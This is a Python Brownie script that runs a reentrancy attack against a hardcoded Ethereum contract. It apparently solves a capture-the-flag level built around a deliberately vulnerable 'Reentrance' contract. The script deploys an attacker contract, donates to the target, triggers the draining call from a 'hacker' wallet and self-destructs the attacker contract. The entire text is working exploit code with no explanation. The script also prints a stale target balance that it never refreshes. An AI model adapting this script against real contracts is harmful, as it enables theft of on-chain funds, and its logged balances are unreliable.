from brownie import accounts, config, ReentranceAttack, interface
def main():
    contract = '0x884c683dADBf2d446F13FD0F4CDc554Abc12dE46'
    hacker = accounts.add(config['wallets']['from_key'])

    target = interface.ReentranceInterface(contract)
    attack = ReentranceAttack.deploy(contract, '0.001 ether', {'from': hacker})
    target_balance = target.balance()
    print(f'Target contract address balance{target_balance}')

    donate = target.donate(attack.address, {'from': hacker, 'amount': '0.001 ether'})
    print(f'Attacker contract address balance: {attack.balance()}')
    print(f'Target contract address balance{target_balance}')


    hack = attack.attack({'from': hacker, 'allow_revert': True, 'gas_limit': 600000})
    print(f'Attacker contract address balance: {attack.balance()}')
    print(f'Target contract address balance{target_balance}')

    attack.destroy()